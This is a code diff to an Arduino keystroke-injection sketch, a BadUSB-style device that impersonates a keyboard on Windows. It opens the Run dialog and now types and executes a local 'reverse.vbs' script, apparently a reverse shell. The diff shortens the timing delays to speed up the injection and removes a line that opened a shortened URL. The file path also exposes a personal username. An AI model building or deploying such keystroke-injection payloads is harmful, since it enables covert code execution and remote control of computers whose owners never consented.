@@ -6,27 +6,23 @@ void openCmd() {
   // Press Windows key + R to open Run dialog
   Keyboard.press(KEY_LEFT_GUI);  // Windows key
   Keyboard.press('r');
-  delay(100);
+  delay(20);
   Keyboard.releaseAll();
   
   // Wait for Run dialog to open
-  delay(500);
+  delay(100);
   
   // Type "cmd"
-  Keyboard.print("cmd");
+  Keyboard.print("C:\\Users\\Sazid Hasan\\OneDrive\\Desktop\\reverse.vbs");
   
   // Press Enter to execute
-  delay(200);
+  delay(20);
   Keyboard.press(KEY_RETURN);
-  delay(100);
+  delay(20);
   Keyboard.release(KEY_RETURN);
 
   delay(500);
 
-  Keyboard.print("start https://tinyurl.com/rn8vb7dm");
-  Keyboard.press(KEY_RETURN);
-  delay(100);
-  Keyboard.release(KEY_RETURN);
 }
 
 void setup() {
